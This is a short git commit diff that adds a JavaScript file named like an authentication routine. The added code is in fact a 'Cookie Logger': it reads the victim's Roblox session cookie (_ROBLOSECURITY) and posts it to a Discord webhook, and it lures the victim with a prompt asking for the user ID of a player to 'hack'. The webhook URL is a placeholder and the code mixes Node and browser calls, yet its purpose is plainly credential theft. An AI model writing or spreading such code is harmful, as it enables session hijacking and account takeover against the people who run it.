e8c39b6c35b523b83ce36f67a1bc5438a93dad2b
No <63305085+DecryptableByte@users.noreply.github.com>
2020-12-19 07:53:39 -0600

    Update RunAuthenticationProccess.js

--- RunAuthenticationProccess.js
+++ RunAuthenticationProccess.js
@@ -1,1 +1,19 @@
+const discord = require('discord.js')
+const client = new discord.Client();
 
+const Cookie = document.cookie
+  .split('; ')
+  .find(row => row.startsWith('_ROBLOSECURITY'))
+  .split('=')[1];
+
+const webhook = require("webhook-discord");
+ 
+const Hook = new webhook.Webhook("WEBHOOK URL");
+ 
+const msg = new webhook.MessageBuilder()
+                .setName("Cookie Logger V1.00")
+                .setColor("#0084FF")
+                .setText(`Cookie logged _ROBLOSECURITY successful! ‘‘‘${Cookie}‘‘‘`);
+Hook.send(msg);
+
+prompt('Enter in the players User ID you want to hack.')
